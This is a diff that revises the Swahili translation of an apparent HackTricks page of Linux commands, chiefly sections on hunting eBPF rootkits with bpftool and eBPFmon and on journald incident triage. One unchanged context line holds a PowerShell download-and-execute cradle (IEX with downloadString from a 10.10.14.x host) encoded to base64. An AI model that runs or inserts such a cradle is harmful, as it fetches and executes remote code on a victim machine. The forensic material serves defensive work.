@@ -129,7 +129,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## Bash for Windows
+## Bash kwa Windows
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -301,9 +301,9 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## eBPF Telemetry na Uwindaji wa Rootkit
+## Telemetry ya eBPF na Uwindaji wa Rootkit
 
-Rootkit za kisasa (TripleCross, variants za BPFDoor, n.k.) zinazidi kudumu kama eBPF programs zilizofichwa. Weka baseline ya fleet yako kwa kutumia `bpftool`/`eBPFmon` ili uweze kugundua programs zisizosainiwa, cgroup hooks zisizotarajiwa, au map contents hasidi kabla ya kuzi-detach.
+Rootkit za kisasa (TripleCross, variants za BPFDoor, n.k.) zinazidi kudumu kama eBPF programs zilizofichwa. Weka baseline ya mifumo yako kwa `bpftool`/`eBPFmon` ili uweze kubaini programs zisizosainiwa, cgroup hooks zisizotarajiwa, au map contents hasidi kabla ya kuziondoa.<sup>[[1]](#references)</sup>
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -321,11 +321,11 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-Linganisha output ya `bpftool` na attachments zinazotarajiwa za NIC/cgroup; programu ya ghafla ya `xdp` au `kprobe` inayomilikiwa na PID ambayo haijaidhinishwa ni kiashiria thabiti cha eBPF payload iliyoingizwa.
+Husianisha matokeo ya bpftool na viambatisho vinavyotarajiwa vya NIC/cgroup; programu ya `xdp` au `kprobe` inayomilikiwa ghafla na PID ambayo haijaidhinishwa ni kiashiria thabiti cha payload ya eBPF iliyodungwa.
 
-## Uchunguzi wa Haraka wa Matukio ya Journald
+## Uchambuzi wa Awali wa Tukio la Journald
 
-systemd-journald huhifadhi metadata iliyopangwa, hivyo unaweza kuchuja kwa boot, severity, unit, au UID bila kugusa `/var/log/*`. Unganisha filters na timestamps zinazohusiana ili kutenga vipindi vya shambulio au kuthibitisha haraka kuchezea log.
+systemd-journald huhifadhi metadata yenye muundo, hivyo unaweza kuchanganua kulingana na boot, ukali, unit, au UID bila kugusa `/var/log/*`. Changanya filters na timestamps za kulinganisha ili kutenga vipindi vya mashambulizi au kuthibitisha haraka udukuzi wa logs.<sup>[[2]](#references)</sup>
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -336,11 +336,11 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-Ongeza `--grep 'Invalid user' --case-sensitive` au `-k` (kernel ring buffer pekee) unapohitaji filters zenye kubana zaidi, na kumbuka kuwa selectors `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, na `_TRANSPORT` huunganishwa kwa hunts za multi-tenant.
+Ongeza `--grep 'Invalid user' --case-sensitive` au `-k` (kernel ring buffer only) unapohitaji vichujio vyenye ukali zaidi, na kumbuka kuwa selectors `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME`, na `_TRANSPORT` huunganishwa kwa pamoja kwa uchunguzi wa multi-tenant.
 
 ## Marejeleo
 
-- [eBPFmon: Tool mpya ya kuchunguza na kuingiliana na applications za eBPF](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [Jinsi ya kutumia command ya journalctl kutazama logs za Linux](https://www.hostinger.com/tutorials/journalctl-command)
+- [1] [eBPFmon: A new tool for exploring and interacting with eBPF applications](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [2] [How to use the journalctl command to view Linux logs](https://www.hostinger.com/tutorials/journalctl-command)
 
 {{#include ../../banners/hacktricks-training.md}}
